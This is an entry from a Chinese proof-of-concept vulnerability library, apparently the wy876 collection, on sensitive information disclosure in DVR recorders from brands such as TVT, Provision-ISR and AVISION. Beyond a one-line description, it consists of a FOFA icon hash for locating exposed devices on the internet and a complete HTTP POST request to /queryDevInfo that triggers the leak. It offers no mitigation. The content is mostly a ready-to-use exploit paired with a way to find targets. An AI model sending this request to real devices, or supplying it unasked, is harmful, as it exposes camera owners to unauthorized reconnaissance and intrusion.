---
fofa: "icon_hash="
source: "wy876 漏洞文库"
---

# DVR设备存在敏感信息泄露

# 一、漏洞简介
DVR（数字视频录像机）设备中，包括 TVT、Provision-ISR、AVISION 等品牌的机型。DVR设备存在敏感信息泄露

# 二、影响版本
+ DVR

# 三、资产测绘
+ fofa`icon_hash="492290497"`
+ 特征


# 四 、漏洞复现
```java
POST /queryDevInfo HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Language: en-US,en;q=0.9
Accept-Encoding": gzip, deflate
Accept: */*
Connection: keep-alive

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/og9o95nb4rdos806>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
